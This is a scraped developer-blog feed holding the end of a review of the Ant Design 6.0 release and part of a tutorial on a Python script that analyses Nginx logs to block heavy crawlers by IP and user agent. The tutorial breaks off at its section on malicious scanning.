12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a241907c9093495da4afafdc406e0800~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572311&amp;x-signature=RUCRowG2xt3nYvPykd1H740vSr0%3D" alt="image.png" loading="lazy"/></p>
<p>大家好😁。</p>
<p>还记得我之前那篇吐槽《<a href="https://juejin.cn/post/7571176484515659828" target="_blank" title="https://juejin.cn/post/7571176484515659828">当 Ant Design 成了你最大的技术债</a>》的文章吗😂？在那篇文章里，我痛斥了 Antd 的黑盒样式、难以覆盖的 <code>!important</code> 地狱，以及臃肿的 CSS-in-JS 运行时性能。</p>
<p>当时有很多朋友在评论区说：<strong>国内做 B 端，离不开它</strong>。</p>
<p>前天，Ant Design 6.0 正式发布了。带着审视（甚至是一点点找茬🤔）的心态，我仔细翻阅了 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fant-design%2Fant-design%2Freleases%2Ftag%2F6.0.0" target="_blank" title="https://github.com/ant-design/ant-design/releases/tag/6.0.0" ref="nofollow noopener noreferrer">Release Note</a> 和源码。</p>
<p>看完之后，我沉默了片刻，然后想说一句：
<strong>这一次，Ant Design 好像真的听懂了我们的骂声。它正在试图撕掉笨重的标签，向现代前端开发范式（Tailwind、Headless）发起一次自我更新。</strong></p>
<p>今天，我就以一个老用户的视角，来聊聊 Antd 6.0 到底改了什么，以及作为技术组长，我怎么看待这次升级🤷‍♂️。</p>
<hr/>
<h4 data-id="heading-0"><strong>告别运行时，拥抱 CSS Variables</strong></h4>
<p>在 v5 版本，Antd 引入了 CSS-in-JS。虽然它解决了按需加载的问题，但带来的运行时性能损耗和样式插入延迟，一直是性能敏感型项目的噩梦😭。</p>
<p><strong>v6 做了一个极其正确的决定：默认采用纯 CSS Variables模式，并且支持零运行时（Zero Runtime）。</strong></p>
<p>这意味着什么？</p>
<p><strong>性能大翻身</strong>：浏览器原生支持 CSS 变量，不再需要 JS 去计算和插入样式。根据官方的对比图，Zero Runtime 模式下的性能表现是最佳的。这也意味着，我们那臃肿的 JS Bundle 终于可以瘦身了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29f016620eb4474a83bc8868f28ded5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572311&amp;x-signature=CpiJt0i3u28c%2BzNqvx1KO%2FjIyN8%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc3cfe814bea47cabfc37b3d8f2e46ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572311&amp;x-signature=nbMT0mGRZ66GBi%2BVFMMYXvGqi%2Fw%3D" alt="image.png" loading="lazy"/></p>
<p><strong>主题切换秒变</strong>：以前切换暗色模式，可能需要 JS 重新计算一堆 Token。现在？只需要改变根节点的几个 CSS 变量值，浏览器瞬间完成渲染。</p>
<p><strong>拥抱 React 19</strong>：这次升级开启了 React Compiler 支持，并且彻底移除了对 React 16/17 的兼容代码，轻装上阵。</p>
<p>这才是 2025 年组件库该有的样子。CSS 的事情，就该让 CSS 去做，JS 别管太宽🤔。</p>
<hr/>
<h4 data-id="heading-1"><strong>全量组件语义化</strong></h4>
<p>这是我最兴奋的一点😁。</p>
<p>以前我们想改一个 <code>Modal</code> 的样式，得去浏览器里扒 <code>ant-modal-content</code>、<code>ant-modal-header</code> 这种类名，然后写一堆高权重的 CSS 去覆盖。</p>
<p><strong>v6 完成了所有组件的 DOM 语义化改造。</strong></p>
<p>它引入了 <code>classNames</code> 和 <code>styles</code> 属性（这就很有 Headless UI 的味道了🤔），允许你精准地把样式注入到组件的内部结构中。</p>
<p>比如，你想做一个俏皮风格的按钮，或者一个极客风的卡片，你不再需要写恶心的 CSS Selector，而是可以直接这样写：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// 简直是 Tailwind 玩家的福音</span>
&lt;<span class="hljs-title class_">Button</span>
  classNames={{
    <span class="hljs-attr">root</span>: <span class="hljs-string">'rounded-tr-xl rounded-bl-xl'</span>, <span class="hljs-comment">// 直接写 Tailwind 类名！</span>
    <span class="hljs-attr">icon</span>: <span class="hljs-string">'rotate-30'</span>,
  }}
  icon={<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">SmileOutlined</span> /&gt;</span></span>}
&gt;
  <span class="hljs-title class_">Ant</span> <span class="hljs-title class_">Design</span>
&lt;/<span class="hljs-title class_">Button</span>&gt;
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa06de73e6ea4d1a8abef923f5e9412b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572311&amp;x-signature=230ixSNWltPab1eeN91okftYnJM%3D" alt="image.png" loading="lazy"/></p>
<p><strong>极客风卡片样式和效果</strong></p>
<pre><code class="hljs language-jsx" lang="jsx">&lt;<span class="hljs-title class_">Card</span>
  title=<span class="hljs-string">"Hello World"</span>
  classNames={{
    <span class="hljs-attr">root</span>: <span class="hljs-string">"bg-green-300/10 text-green-500 border-green-500 rounded-none [box-shadow:0_0_8px_theme(colors.green.500)]"</span>,
    <span class="hljs-attr">header</span>: <span class="hljs-string">"rounded-none border-green-500 [box-shadow:inset_0_0_8px_theme(colors.green.500)]"</span>,
    <span class="hljs-attr">title</span>:
      <span class="hljs-string">"text-green-500 [text-shadow:0_0_12px_theme(colors.green.400)] overflow-visible"</span>,
      <span class="hljs-attr">body</span>: <span class="hljs-string">"rounded-none [text-shadow:0_0_8px_theme(colors.green.400)] [box-shadow:inset_0_0_12px_theme(colors.green.500)]"</span>
  }}
&gt;
  <span class="hljs-title class_">Ant</span> <span class="hljs-title class_">Design</span> loves you!~ (=^・ω・^)
&lt;/<span class="hljs-title class_">Card</span>&gt;
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/463ae39771804f5ab689be14dfe43544~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572311&amp;x-signature=hy%2FwMBbMaz%2BHplPmQ%2FsNMcDk860%3D" alt="image.png" loading="lazy"/></p>
<p>Antd 终于意识到，它不能只做写死的积木，它得提供接口。这对于追求 UI 个性化的团队来说，绝对是史诗级利好👍👍👍。</p>
<hr/>
<h4 data-id="heading-2"><strong>IE 走好，不送</strong></h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a1d7a8f2507419aba4e3ce82d4d9b87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572311&amp;x-signature=jUyioIEKaRDBoOjEoPkgbUUXY%2Bs%3D" alt="Suggestion.gif" loading="lazy"/></p>
<p>Antd 6.0 做了一个非常硬气的决定：<strong>彻底移除对 IE 的支持。</strong></p>
<p>同时，React 的最低版本要求提升到了 <strong>React 18!</strong>。</p>
<p>这可能对一些维护古董项目的团队是坏消息，但对于整个前端生态来说，这是大快人心的。我们终于不需要为了那 1% 的 IE 用户，去背负沉重的 polyfill 和 hack 代码了。</p>
<hr/>
<h4 data-id="heading-3"><strong>Ant Design X 2.0</strong></h4>
<p>除了一些基础库的升级，这次还有一个重磅消息：<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fant-design%2Fx%2Fissues%2F1358" target="_blank" title="https://github.com/ant-design/x/issues/1358" ref="nofollow noopener noreferrer">Ant Design X 2.0 同步发布</a></strong>。</p>
<p>现在哪个 B 端产品不加点 AI 功能？Chat 界面、流式输出、提示词输入... 这些东西要是自己从头写，非常费劲。</p>
<p>Ant Design X 就是专门解决这个问题的。它不仅仅是 UI，更包含了一套面向 AI 场景的交互逻辑。</p>
<p>前端的战场正在从 CRUD 系统转向 AI 交互界面。Antd 这一步棋，走得很稳👍。</p>
<hr/>
<h4 data-id="heading-4"><strong>升级建议：要不要冲？🤔</strong></h4>
<p>作为技术组长，我不建议盲目升级，但我建议你<strong>认真评估</strong>。</p>
<p><strong>如果你是 v5 用户：直接冲！</strong> 官方承诺是平滑迁移，无需 codemod，直接升级即可。你能立刻获得性能提升和 CSS 变量的红利。</p>
<p><strong>如果你是 v4 用户</strong>：v6 移除了 v4 的废弃 API。这依然是一次断崖式的升级，成本较高。建议先升级到 v5 过渡，或者在新项目中直接使用 v6。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47d5c321da9f4ac49979ef2508da2ced~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572311&amp;x-signature=fNf5VgbdCG8GBjyLtwhK%2BT7cXC4%3D" alt="image.png" loading="lazy"/></p>
<p><strong>如果你还在维护 IE 项目</strong>：留在 v5 吧，v5 进入了 1 年的维护周期，足够你养老了😖。</p>
<hr/>
<p>Ant Design 已经 10 岁了🫅。</p>
<p>在一个技术栈迭代快如闪电的时代，一个库能活 10 年，并且还能在第 10 年做出 v6 这样推倒重来式的革新，是值得赞扬的👍👍👍。</p>
<p>虽然我依然推崇 Tailwind + Headless UI 的灵活性，但 Ant Design 6.0 让我看到了重型组件库的另一种可能性——<strong>它在努力变轻，努力变开放，努力适应 AI 时代。</strong></p>
<p>也许，它不再是我最大的技术债，而重新变成了那个可以信赖的老伙计😁。</p>
<p><strong>你们怎么看这次 Antd 6.0 的升级？</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[WordPress保卫战：用Python分析日志并封禁恶意爬虫]]></title>    <link>https://juejin.cn/post/7575742632334377010</link>    <guid>https://juejin.cn/post/7575742632334377010</guid>    <pubDate>2025-11-24T06:29:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575742632334377010" data-draft-id="7575718948299046963" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="WordPress保卫战：用Python分析日志并封禁恶意爬虫"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-11-24T06:29:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/3432034642699739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            WordPress保卫战：用Python分析日志并封禁恶意爬虫
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3432034642699739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:29:38.000Z" title="Mon Nov 24 2025 06:29:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你是否遇到过这种情况：</p>
<ul>
<li><strong>现象</strong>：你的WordPress博客突然变慢，甚至出现 502 Bad Gateway 错误。</li>
<li><strong>排查</strong>：登录服务器查看 ​<code>​top​</code>​，发现 CPU 占用率飙升到 100%，PHP-FPM 进程多得吓人。</li>
<li><strong>真相</strong>：查看 Nginx 或 Apache 的访问日志，发现并没有多少真实人类在看文章，反而是大量的机器人在疯狂抓取。</li>
</ul>
<p><strong>为什么资源会紧张？</strong> WordPress 是动态网站，每一次页面访问都需要 PHP 解析和 MySQL 查询。如果一个爬虫每秒发起 10 个请求，对于一台配置较低（如 1核2G）的 VPS 来说，这就足以让数据库崩溃。</p>
<p>除了 Google、Bing 这种带来流量的“好爬虫”，互联网上充斥着大量<strong>无用爬虫</strong>：</p>
<ol>
<li><strong>SEO工具爬虫</strong>（Ahrefs, Semrush, MJ12bot）：对你没流量贡献，却疯狂消耗资源。</li>
<li><strong>内容采集器</strong>：想把你的原创文章搬运走。</li>
<li><strong>bug扫描器</strong>：疯狂探测 ​<code>​wp-login.php​</code>​ 或 ​<code>​xmlrpc.php​</code>​。</li>
</ol>
<p>今天，我们不装臃肿的防火墙插件，而是用 <strong>Python</strong> 这种轻量级武器，从日志中揪出这些“资源吸血鬼”，并在服务器层面直接封杀。</p>
<hr/>
<h3 data-id="heading-0">🛠️ 第一步：获取作案证据（访问日志）</h3>
<p>首先，你需要找到 Web 服务器的访问日志（Access Log）。 通常在 Linux 服务器上，路径如下：</p>
<ul>
<li><strong>Nginx</strong>: ​<code>​/var/log/nginx/access.log​</code>​</li>
<li><strong>Apache</strong>: ​<code>​/var/log/apache2/access.log​</code>​ 或 ​<code>​/var/log/httpd/access_log​</code>​</li>
</ul>
<p>把这个文件下载到本地，或者直接在服务器上用 Python 处理。</p>
<hr/>
<h3 data-id="heading-1">🐍 第二步：Python 编写“爬虫侦探”脚本</h3>
<p>我们将编写一个 Python 脚本，完成以下任务：</p>
<ol>
<li>解析日志文件。</li>
<li>统计 IP 的访问频率。</li>
<li>统计 User-Agent（用户代理）的分布。</li>
<li>自动生成封禁名单。</li>
</ol>
<h4 data-id="heading-2">核心代码：​<code>​analyze_bot.py​</code>​</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> re
<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter
<span class="hljs-keyword">import</span> csv

<span class="hljs-comment"># --- 配置区域 ---</span>
LOG_FILE = <span class="hljs-string">'access.log'</span>  <span class="hljs-comment"># 你的日志文件路径</span>
THRESHOLD = <span class="hljs-number">500</span>          <span class="hljs-comment"># 阈值：如果一个IP在日志中出现超过500次，视为可疑</span>
OUTPUT_BAN_FILE = <span class="hljs-string">'nginx_deny_list.conf'</span> <span class="hljs-comment"># 输出的封禁配置文件</span>

<span class="hljs-comment"># Nginx日志正则匹配模式 (根据你的日志格式调整，这是默认格式)</span>
<span class="hljs-comment"># 格式示例: 192.168.1.1 - - [23/Nov/2025:10:00:00 +0000] "GET / HTTP/1.1" 200 ...</span>
LOG_PATTERN = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r'(?P&lt;ip&gt;\d+.\d+.\d+.\d+).*?"(?P&lt;method&gt;\w+) (?P&lt;path&gt;.*?) HTTP.*?" (?P&lt;status&gt;\d+) .*?"(?P&lt;agent&gt;.*?)"'</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_logs</span>():
    ip_counter = Counter()
    ua_counter = Counter()
    suspicious_ips = {} <span class="hljs-comment"># 存储 {ip: user_agent}</span>

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"🔄 正在分析日志: <span class="hljs-subst">{LOG_FILE}</span> ..."</span>)
    
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(LOG_FILE, <span class="hljs-string">'r'</span>, encoding=<span class="hljs-string">'utf-8'</span>, errors=<span class="hljs-string">'ignore'</span>) <span class="hljs-keyword">as</span> f:
        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:
            <span class="hljs-keyword">match</span> = LOG_PATTERN.search(line)
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:
                data = <span class="hljs-keyword">match</span>.groupdict()
                ip = data[<span class="hljs-string">'ip'</span>]
                ua = data[<span class="hljs-string">'agent'</span>]
                
                <span class="hljs-comment"># 统计IP和UA</span>
                ip_counter[ip] += <span class="hljs-number">1</span>
                ua_counter[ua] += <span class="hljs-number">1</span>
                
                <span class="hljs-comment"># 记录最后一次该IP使用的UA，方便人工复核</span>
                suspicious_ips[ip] = ua

    <span class="hljs-keyword">return</span> ip_counter, ua_counter, suspicious_ips

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_report</span>(<span class="hljs-params">ip_counts, ua_counts, suspicious_data</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n--- 📊 访问量 Top 10 IP ---"</span>)
    top_ips = ip_counts.most_common(<span class="hljs-number">10</span>)
    <span class="hljs-keyword">for</span> ip, count <span class="hljs-keyword">in</span> top_ips:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"IP: <span class="hljs-subst">{ip}</span> | 次数: <span class="hljs-subst">{count}</span> | UA摘要: <span class="hljs-subst">{suspicious_data[ip][:<span class="hljs-number">30</span>]}</span>..."</span>)

    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n--- 🤖 访问量 Top 10 User-Agents ---"</span>)
    <span class="hljs-keyword">for</span> ua, count <span class="hljs-keyword">in</span> ua_counts.most_common(<span class="hljs-number">10</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"次数: <span class="hljs-subst">{count}</span> | UA: <span class="hljs-subst">{ua}</span>"</span>)

    <span class="hljs-comment"># 生成 Nginx 封禁列表</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n--- 🚫 生成封禁建议 (超过 <span class="hljs-subst">{THRESHOLD}</span> 次访问) ---"</span>)
    banned_count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(OUTPUT_BAN_FILE, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:
        f.write(<span class="hljs-string">"# Auto-generated block list\n"</span>)
        <span class="hljs-keyword">for</span> ip, count <span class="hljs-keyword">in</span> ip_counts.items():
            <span class="hljs-keyword">if</span> count &gt; THRESHOLD:
                <span class="hljs-comment"># 排除本地回环</span>
                <span class="hljs-keyword">if</span> ip.startswith(<span class="hljs-string">'127.0.0'</span>): <span class="hljs-keyword">continue</span> 
                
                <span class="hljs-comment"># 写入 Nginx 格式: deny 1.2.3.4;</span>
                f.write(<span class="hljs-string">f"deny <span class="hljs-subst">{ip}</span>;\n"</span>)
                banned_count += <span class="hljs-number">1</span>
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"✅ 已生成配置文件: <span class="hljs-subst">{OUTPUT_BAN_FILE}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"🔨 建议封禁的 IP 数量: <span class="hljs-subst">{banned_count}</span>"</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    <span class="hljs-keyword">try</span>:
        ip_counts, ua_counts, suspicious_data = analyze_logs()
        generate_report(ip_counts, ua_counts, suspicious_data)
    <span class="hljs-keyword">except</span> FileNotFoundError:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"❌ 错误：找不到日志文件，请检查路径。"</span>)
</code></pre>
<hr/>
<h3 data-id="heading-3">🕵️ 第三步：案例分析与实战操作</h3>
<p>假设你运行了上面的代码，得到以下输出结果，我们来分析几个典型场景。</p>
<h4 data-id="heading-4">场景 A：暴力的 IP 采集者</h4>
<p><strong>脚本输出：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">IP:</span> <span class="hljs-number">45.132</span><span class="hljs-string">.xx.xx</span> <span class="hljs-string">|</span> <span class="hljs-string">次数:</span> <span class="hljs-number">5000</span> <span class="hljs-string">|</span> <span class="hljs-string">UA摘要:</span> <span class="hljs-string">Python-urllib/3.8...</span>
</code></pre>
<p><strong>分析</strong>：一个 IP 访问了 5000 次，User-Agent 竟然是 ​<code>​Python-urllib​</code>​。这意味着有人在写简陋的脚本暴力抓取你的站，完全没有伪装。 <strong>对策</strong>：<strong>直接封杀 IP</strong>。</p>
<h4 data-id="heading-5">场景 B：伪装成正常的 SEO 工具</h4>
<p><strong>脚本输出：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">次数:</span> <span class="hljs-number">2000</span> <span class="hljs-string">|</span> <span class="hljs-attr">UA:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(compatible;</span> <span class="hljs-string">MJ12bot/v1.4.8;</span> <span class="hljs-string">...)</span>
<span class="hljs-string">次数:</span> <span class="hljs-number">1500</span> <span class="hljs-string">|</span> <span class="hljs-attr">UA:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(compatible;</span> <span class="hljs-string">SemrushBot/7~bl;</span> <span class="hljs-string">...)</span>
</code></pre>
<p><strong>分析</strong>：MJ12bot 和 SemrushBot 是著名的 SEO 分析工具。它们不是恶意ddos，但它们抓取频率极高，而且对普通博客来说，这类商业 SEO 数据的价值远低于它们消耗的服务器资源。 <strong>对策</strong>：<strong>通过 User-Agent 屏蔽</strong>。</p>
<h4 data-id="heading-6">场景 C：恶意扫描</h4>
